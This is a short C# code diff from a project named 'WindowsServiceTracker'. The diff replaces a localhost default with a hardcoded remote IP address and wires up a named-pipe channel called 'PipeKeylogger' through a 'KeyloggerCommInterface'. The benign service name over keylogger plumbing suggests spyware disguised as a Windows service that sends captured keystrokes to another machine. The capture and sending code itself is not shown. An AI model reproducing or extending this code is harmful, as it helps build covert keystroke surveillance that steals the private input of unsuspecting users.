@@ -38,8 +38,8 @@ namespace WindowsServiceTracker
         private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
 
         //Variables
-        private volatile String ipAddressString = "127.0.0.1";
-        private long ipAddress = 0x0100007F; //default to local host
+        private volatile String ipAddressString = "172.17.57.149";
+        private IPAddress ipAddress = new IPAddress(0x0100007F);// = 0x0100007F; //default to local host
         private IPEndPoint ipPort;
         private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
             new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeKeylogger"));
@@ -88,7 +88,7 @@ namespace WindowsServiceTracker
             //convert string IP to long
             try
             {
-                ipAddress = BitConverter.ToInt32(IPAddress.Parse(ipAddressString).GetAddressBytes(), 0);
+                ipAddress = IPAddress.Parse(ipAddressString);
             }
             catch (Exception)
             { }
